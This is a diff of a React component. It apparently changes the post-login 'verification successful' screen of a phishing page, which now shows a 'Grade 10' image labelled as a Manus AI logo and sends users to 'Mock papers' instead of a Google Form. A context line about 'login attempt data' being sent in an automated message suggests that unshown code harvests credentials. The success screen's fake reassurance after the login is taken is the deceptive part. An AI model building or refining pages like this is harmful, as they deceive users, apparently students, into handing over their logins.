@@ -54,22 +54,32 @@ This is an automated message with login attempt data.`,
 
   if (showSuccessScreen) {
     return (
+        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+        <div className="w-full max-w-sm text-center">
+          {/* Manus AI Logo */}
+          <div className="mb-8">
+            <img 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=Grade+10" 
+              alt="Manus AI Logo" 
+              className="w-48 h-auto mx-auto"
+            />
+          </div>
     
           
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              Verification is successfully completed, please proceed to the google form
+              Verification is successfully completed, please proceed to the Mock papers
             </h1>
             
             {/* Continue Button - redirects to google.com */}
             <button
               onClick={() => {
-                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLScx4_6USiDT-xtr4wx0sMQFFnqWbAdQscDAm95pH8v7_rwU-w/viewform?usp=header';
+                window.location.href = 'google.com';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
-              Google Form
+              papers
             </button>
           </div>
         </div>
